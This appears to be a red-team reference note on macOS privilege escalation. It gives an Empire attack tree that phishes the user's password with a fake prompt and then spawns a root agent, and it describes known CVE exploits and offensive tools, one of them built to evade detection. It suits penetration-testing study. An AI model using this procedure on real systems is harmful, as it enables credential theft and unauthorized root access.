# Privilege escalation on macOS

## Attack tree

```text
1 Empire agent running on macOS (AND)
2 Interact with agent
    2.1 > usemodule (double tab to list modules available) (AND)
    2.2 > usemodule collection/osx/prompt (not opsec safe, we'll be leaving traces)
    2.3 > execute (and copy user password)
    2.4 > Back
    2.5 > usemodule privesc/multi/sudo_spawn (executes another stager with admin priviliges, and requires a password)
    2.6 > info (to see all options)
    2.7 > set Password [user password]
    2.8 > set Listener [value] (http in our case)
    2.9 > execute
```

## Notes

### Types

* In horizontal privilege escalation an adversary expands privileges by taking over another account.
* In vertical privilege escalation an attacker attempts to gain more permissions or access with an existing compromised account.

### Existing exploits
* [Physmem](https://www.exploit-db.com/exploits/44237) is an exploit that can be used on older macOSs. Physmem exploits 
either CVE-2016-1825 or CVE-2016-7617 depending on the target system. As a local privilege escalation, it requires a 
user to download and run some 3rd party software, a fairly regular occurrence, which unknown to the victim contains 
the malicious code. A seemingly benign piece of software (like a fake Adobe Flash installer, Media downloader or 
similar) could contain the physmem binary and allow that process to elevate to root without the user needing to type 
in an admin or any other kind of password. The vulnerability that makes physmem possible was patched from 10.12.2 
onwards.
* [How to gain root with CVE-2018-4193 in < 10s (pdf)](https://papers.put.as/papers/macosx/2019/OffensiveCon_2019_macOS_how_to_gain_root_with_CVE-2018-4193_in_10s.pdf). Chained with other exploits such as a sandbox escape, CVE-2018-4193 could be used to achieve remote code execution, requiring only that a user click a malicious link.
* CVE-2019-8565 and CVE-2019-8513 can lead to privilege escalation on macOS Mojave 10.14.3 and earlier. Both have already been incorporated into Metasploit and are available to red teamers.

### The above method

* The Empire agent method in the attack tree does not rely on programs and exploits and is highly likely to work as users are trained to enter their passwords regularly for the Apple Store. A new agent appears, one that is root. 
* This example uses macOS but a similar process works for other OS as well. The modules will be different though.

## Tools

* [Babel-sf](https://github.com/attackdebris/babel-sf/) is a collection of tools (scanners, bind shell payloads, and utilities).
* [Egressbuster](https://github.com/trustedsec/egressbuster) checks for filtering of exit ports, and automatically spawns a shell to test for the possibility of data exfiltration.
* [Empire](https://www.kali.org/tools/powershell-empire/) leverages a series of modules to allow for persistence and pivoting.
* [Nishang](https://www.kali.org/tools/nishang/) includes a number of payloads and scripts used by PowerShell for offense security or red team testing. It also allows for customization to allow evasion by malware detection and end-point management agents to execute processes within memory, running stealthily against targets.
* [MacPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) - Just execute `linpeas.sh` in a macOS system and the MacPEAS version will be automatically executed.

## Cheatsheets

* [Empire wiki](https://bc-security.gitbook.io/empire-wiki/)